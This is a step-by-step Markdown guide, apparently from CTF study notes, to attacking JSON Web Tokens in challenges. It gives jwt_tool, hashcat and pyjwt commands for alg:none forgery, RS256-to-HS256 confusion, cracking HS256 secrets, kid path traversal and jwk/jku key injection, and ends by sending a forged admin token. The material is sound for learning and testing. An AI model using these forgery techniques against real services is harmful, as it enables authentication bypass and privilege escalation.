# JWT: Step-by-Step Guide

Practical workflow for analyzing and attacking a challenge JWT. Concepts and vectors in
`1. Fundamentos e Quando Usar.md`.

## 0. Tools

- **jwt.io**: https://jwt.io (visual, manual)
- **jwt_tool**: https://github.com/ticarpi/jwt_tool (automates the common attacks)
  ```bash
  git clone https://github.com/ticarpi/jwt_tool
  cd jwt_tool && pip install -r requirements.txt
  ```
- **pyjwt**: `pip install pyjwt` (quick scripting in Python)
- **hashcat**: for offline brute-force of an HS256 secret

## 1. Decode and inspect

1. Paste the token into https://jwt.io; the left panel shows the decoded header + payload.
2. Note: **`alg`** (algorithm), the relevant claims (`user`, `role`, `admin`, `exp`, `kid`, `jwk`,
   `jku` if present).
3. Terminal alternative (without sending it anywhere):
   ```bash
   python3 -c "
   import base64, json, sys
   token = '<token>'
   header, payload, sig = token.split('.')
   def decode(part):
       part += '=' * (-len(part) % 4)
       return json.loads(base64.urlsafe_b64decode(part))
   print('Header:', decode(header))
   print('Payload:', decode(payload))
   "
   ```

## 2. Pick the vector based on what showed up

| What you see | Vector to try |
|---|---|
| `"alg": "none"` already accepted, or you want to test if it is | `alg:none` attack (step 3) |
| `"alg": "RS256"` and you have the server's **public key** | RS256→HS256 algorithm confusion (step 4) |
| `"alg": "HS256"` and you suspect a weak secret | Secret brute-force (step 5) |
| A `"kid"` field in the header | `kid` injection (step 6) |
| A `"jwk"` or `"jku"` field in the header | Own-key injection (step 6) |

## 3. `alg: none` attack

With `jwt_tool`:
```bash
python3 jwt_tool.py <token> -X a
```
Manually: edit the header to `{"alg":"none","typ":"JWT"}`, re-base64url the header and payload
(without `=` padding), join with a dot, and **leave the signature empty** with the trailing dot:
```
<header_b64>.<payload_b64>.
```

## 4. Algorithm confusion (RS256 → HS256)

With `jwt_tool`:
```bash
python3 jwt_tool.py <token> -X k -pk public_key.pem
```
What happens behind the scenes: the server validates with `HMAC(public_key_as_string, header.payload)`
instead of verifying the RSA signature. If it doesn't check the declared `alg` against the
expected one, the forged token passes.

## 5. HS256 secret brute-force

Extract the hash in hashcat format:
```bash
python3 jwt_tool.py <token>   # jwt_tool already indicates the right hashcat mode
```
Or directly:
```bash
hashcat -a 0 -m 16500 <token> rockyou.txt
```
Once the secret is found, re-sign the token with `pyjwt`:
```python
import jwt
new_token = jwt.encode({"user": "admin", "role": "admin"}, "<found_secret>", algorithm="HS256")
print(new_token)
```

## 6. Injection via `kid` / `jwk` / `jku`

With `jwt_tool` (interactive mode guides you through the options):
```bash
python3 jwt_tool.py <token> -T
```
- **`kid` path traversal:** try values like `../../../../dev/null` (if the server uses the `kid` to
  build a file path, an empty/known file can become the "secret").
- **Embedded `jwk`:** generate a key pair, embed the public key in the header (`jwk`), sign with
  the private key. If the server trusts the key that comes in the token itself, it accepts it.

## 7. After forging the token

1. Decode it again in jwt.io (or the script from step 1) to confirm the claims before sending.
2. Use the forged token in the request (header `Authorization: Bearer <token>`) against the
   challenge.
